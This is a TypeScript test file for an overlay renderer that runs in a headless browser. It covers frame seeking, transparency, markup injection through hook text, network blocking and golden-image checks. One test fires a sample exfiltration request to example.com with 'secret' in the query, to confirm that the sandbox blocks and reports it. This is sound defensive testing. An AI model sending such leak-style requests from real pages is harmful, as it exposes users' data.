import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { existsSync, readFileSync, writeFileSync } from 'node:fs';
import { after, test } from 'node:test';
import { openOverlay } from '../src/index.ts';
import { HOOK_TEXT, fixture, meanAbsDiff, rgba, tempDir } from './helpers.ts';

const { input } = await fixture(await tempDir());
const session = await openOverlay(input, 'draft');
after(() => session.close());

test('scenes are seekable in any order: [40, 3, 77, 3, 40] equals a sequential render', async () => {
  const shuffled: Array<{ f: number; png: Buffer }> = [];
  for (const f of [40, 3, 77, 3, 40]) shuffled.push({ f, png: (await session.frame(f)).png });
  const fresh = await openOverlay(input, 'draft');
  try {
    const seq = new Map<number, Buffer>();
    for (const f of [3, 40, 77]) seq.set(f, (await fresh.frame(f)).png);
    for (const { f, png } of shuffled) assert.ok(png.equals(seq.get(f)!), `frame ${f} differs (mean abs diff ${meanAbsDiff(rgba(png), rgba(seq.get(f)!))})`);
  } finally {
    await fresh.close();
  }
});

test('frames with no overlay are fully transparent', async () => {
  const fr = await session.frame(116);
  assert.ok(fr.empty);
  const px = rgba(fr.png);
  for (let i = 3; i < px.length; i += 4) if (px[i] !== 0) assert.fail(`alpha ${px[i]} at byte ${i}`);
});

test('markup in hook text renders as text and makes no request', async () => {
  for (let f = 0; f < 12; f++) await session.frame(f);
  const dom = await session.page.evaluate(() => ({ imgs: document.querySelectorAll('img').length, texts: [...document.querySelectorAll('div')].map((d) => d.textContent) }));
  assert.equal(dom.imgs, 0);
  assert.ok(dom.texts.includes(HOOK_TEXT));
  assert.deepEqual(session.violations.filter((v) => v.code === 'undeclared_network'), []);
});

test('a request the page attempts is aborted and reported as undeclared_network', async () => {
  const r = await session.page.evaluate(() => fetch('http://example.com/leak?t=secret').then(() => 'loaded', () => 'blocked'));
  assert.equal(r, 'blocked');
  const v = session.violations.filter((x) => x.code === 'undeclared_network');
  assert.equal(v.length, 1);
  // Only the origin is recorded; the query could carry transcript text.
  assert.equal(v[0]!.ref, 'http://example.com');
});

// Golden frames, valid only in the pinned environment named in CLAUDE.md. UPDATE_GOLDEN=1 rewrites them.
const golden = new URL('./golden/', import.meta.url);
const GOLDEN_FRAMES = [20, 70];
test('overlay golden frames match within mean abs diff 1 on RGBA', async () => {
  const manifestPath = new URL('overlay-frames.json', golden);
  const update = process.env.UPDATE_GOLDEN === '1';
  const record: { chromium: string; platform: string; frames: Record<string, string> } = update || !existsSync(manifestPath)
    ? { chromium: session.chromiumVersion, platform: `${process.platform}-${process.arch}`, frames: {} }
    : JSON.parse(readFileSync(manifestPath, 'utf8'));
  for (const f of GOLDEN_FRAMES) {
    const png = (await session.frame(f)).png;
    const file = new URL(`overlay-${f}.png`, golden);
    if (update) {
      writeFileSync(file, png);
      record.frames[f] = createHash('sha256').update(png).digest('hex');
      continue;
    }
    assert.ok(existsSync(file), `missing golden ${f}; run with UPDATE_GOLDEN=1 in the pinned environment`);
    if (createHash('sha256').update(png).digest('hex') === record.frames[f]) continue;
    const d = meanAbsDiff(rgba(png), rgba(readFileSync(file)));
    assert.ok(d <= 1, `frame ${f} mean abs diff ${d}`);
  }
  if (update) writeFileSync(manifestPath, JSON.stringify(record, null, 2) + '\n');
});
